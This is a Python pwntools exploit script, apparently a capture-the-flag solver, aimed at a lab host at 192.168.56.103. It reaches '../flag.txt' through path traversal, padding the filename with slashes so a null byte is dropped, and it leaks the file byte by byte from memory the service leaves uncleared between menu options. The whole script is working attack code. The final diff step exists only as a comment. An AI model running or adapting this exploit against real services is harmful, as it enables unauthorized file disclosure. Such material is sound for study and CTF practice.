from pwn import *
def main():
	"""
	Exploit Bad file null byte append
	Exploit No memory cleanup between options
	Use Frequency analysis of overwritten memory to analysis byte by byte the difference between regular file and overwritten memory
	"""
	HOST = "192.168.56.103"
	PORT = 53338
	r = remote(HOST,PORT)
	for i in xrange(1,12):
		#First option lets us get a file
		print r.recvuntil("option: ")
		r.sendline("1")
		print r.recvuntil("Filename:")

		#Get frequency analysis from flag.txt
		fileName = "../flag.txt" #length ~ 11
		print len(fileName)
		dirName = "./data/" #length ~ 7
		print len(dirName)

		#Null bytes can be removed by using up all the memory for name
		f = "/"*(255-7-11)+fileName
		print len(f)
		r.sendline(f)	
		print r.recvuntil("option: ")

		#Now exploit the fact they haven't cleaned up the memory
		payload = "\x01"*(4095-i)
		payload += "\n"*i
		r.sendline("2")

		#Grab analysis of 1 byte difference between corrupted memory and flag.txt
		print r.recvuntil("data:")
		r.sendline(payload)
		buf = r.recvuntil("option:")
		print buf
		
		#Write freq analysis difference to temporary file
		filename = "temp"+str(i)
		fp = open(filename,"wb")
		fp.write(buf)

		#Now diff temp<i> temp><i+1>
		#Except for temp0
	pass
main()
